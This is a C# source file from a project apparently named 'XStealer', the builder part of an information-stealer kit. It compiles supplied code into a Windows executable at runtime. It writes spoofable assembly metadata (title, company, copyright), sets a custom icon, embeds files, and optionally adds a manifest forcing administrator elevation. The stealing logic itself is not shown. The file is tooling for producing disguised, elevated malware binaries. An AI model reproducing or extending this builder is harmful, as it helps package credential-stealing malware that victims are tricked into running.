using System;
using System.IO;
using Microsoft.CSharp;
using System.Windows.Forms;
using System.CodeDom.Compiler;

namespace XStealer
{
    class CodeDom
    {
        // CompileExecutable method
        public static CompilerResults CompileExecutable(string[] Code, string Output, string Icon, string[] AssemblyInfo, string[] EmbeddedFiles, bool Uac, params string[] References)
        {
            // Create new instance & add references
            var parameters = new CompilerParameters(References, Output)
            {
                // Generate executable
                GenerateExecutable = true,

                // Dont include debug info
                IncludeDebugInformation = false
            };

            // Set replace parts array
            string[] AsmInfoReplace = new string[] { "%TITLE%", "%DESCRIPTION%", "%COMPANY%", "%PRODUCT%", "%COPYRIGHT%", "%TRADEMARK%", "1.0.0.0" };

            // Loop though and replace parts
            for (int i = 0; i < AsmInfoReplace.Length; i++)
            {
                // Replace parts
                FileSources.AssemblyInfo = FileSources.AssemblyInfo.Replace(AsmInfoReplace[i], AssemblyInfo[i]);
            }

            // Check if file exists
            if (!File.Exists("AssemblyInfo.cs"))
            {
                // Create AssemblyInfo.cs file
                File.WriteAllText("AssemblyInfo.cs", FileSources.AssemblyInfo);
            }

            // Set compiler parameters
            parameters.CompilerOptions = "/target:winexe /optimize AssemblyInfo.cs";

            // Check if user wants an icon
            if (Icon != null)
            {
                // Set icon
                parameters.CompilerOptions += @" /win32icon:" + "\"" + Icon + "\"";
            }

            // Check if user wants to embed files
            if (EmbeddedFiles != null)
            {
                // Loop though and embed all files spesificyed by the user
                for (int i = 0; i < EmbeddedFiles.Length; i++)
                {
                    // Embed files
                    parameters.EmbeddedResources.Add(EmbeddedFiles[i]);
                }
            }

            // Check if user wants Uac
            if (Uac == true)
            {
                // Check if file exists
                if (!File.Exists("app.manifest"))
                {
                    // Create app.manifest file
                    File.WriteAllText("app.manifest", FileSources.ManifestFile);
                }

                // Add manifest file to the compiler parameters
                parameters.CompilerOptions += @" /win32manifest:" + "app.manifest";
            }

            // Create new instance
            using (var provider = new CSharpCodeProvider())
            {
                // Check if there were any errors during compilation
                if (provider.CompileAssemblyFromSource(parameters, Code).Errors.Count == 0)
                {
                    MessageBox.Show("build successful");
                }
                else
                {
                    MessageBox.Show("Error compiling executable");
                }
            }

            // Delete AssemblyInfo.cs
            File.Delete("AssemblyInfo.cs");

            // Check if app.manifest exists
            if (File.Exists("app.manifest"))
            {
                // Delete app.manifest
                File.Delete("app.manifest");
            }

            // Return null
            return null;
        }

        // FileSources class
        private static class FileSources
        {
            // AssemblyInfo file source
            public static string AssemblyInfo = @"using System.Reflection;
            using System.Runtime.CompilerServices;
            using System.Runtime.InteropServices;
            [assembly: AssemblyTitle(""%TITLE%"")]
            [assembly: AssemblyDescription(""%DESCRIPTION%"")]
            [assembly: AssemblyCompany(""%COMPANY%"")]
            [assembly: AssemblyProduct(""%PRODUCT%"")]
            [assembly: AssemblyCopyright(""%COPYRIGHT%"")]
            [assembly: AssemblyTrademark(""%TRADEMARK%"")]
            [assembly: AssemblyFileVersion(""1.0.0.0"")]";

            // Manifest file source
            public static string ManifestFile = @"<?xml version=""1.0"" encoding=""utf-8""?>
            <assembly manifestVersion=""1.0"" xmlns=""urn:schemas-microsoft-com:asm.v1"">
            <assemblyIdentity version=""1.0.0.0"" name=""MyApplication.app""/>
            <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v2"">
            <security>
            <requestedPrivileges xmlns=""urn:schemas-microsoft-com:asm.v3"">
            <requestedExecutionLevel level=""requireAdministrator"" uiAccess=""false""/>
            </requestedPrivileges>
            </security>
            </trustInfo>
            <compatibility xmlns=""urn:schemas-microsoft-com:compatibility.v1"">
            <application>
            </application>
            </compatibility>
            </assembly>";
        }
    }
}
